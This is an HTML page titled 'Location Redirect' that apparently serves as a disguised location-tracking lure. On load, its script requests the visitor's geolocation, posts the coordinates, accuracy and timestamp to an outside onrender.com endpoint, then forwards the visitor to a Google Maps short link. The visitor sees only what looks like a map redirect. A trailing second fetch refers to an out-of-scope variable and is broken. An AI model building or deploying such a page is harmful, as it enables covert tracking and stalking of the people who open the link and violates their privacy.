<!DOCTYPE html>
<html>
<head>
    <title>Location Redirect</title>
</head>
<body>
    <script>
        // Replace with your Google Maps URL
        const googleMapsURL = 'https://maps.app.goo.gl/JVUi2F98vrGs1ryn8';

        // Replace with your server endpoint
       const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php'; // Correct

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const coords = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp)
                        };

                        // Send coordinates to server
                        fetch(serverURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(coords)
                        });

                        // Redirect to Google Maps
                        window.location.href = googleMapsURL;
                    },
                    (error) => {
                        alert('Error getting location: ' + error.message);
                        window.location.href = googleMapsURL;
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
                window.location.href = googleMapsURL;
            }
        }

        // Start location request when page loads
        window.onload = getLocation;
        fetch(serverURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(coords)
})
.then(response => {
    if (!response.ok) throw new Error('Server error');
    return response.json();
})
.then(data => console.log('Success:', data))
.catch(error => console.error('Error:', error));
    </script>
</body>
</html>
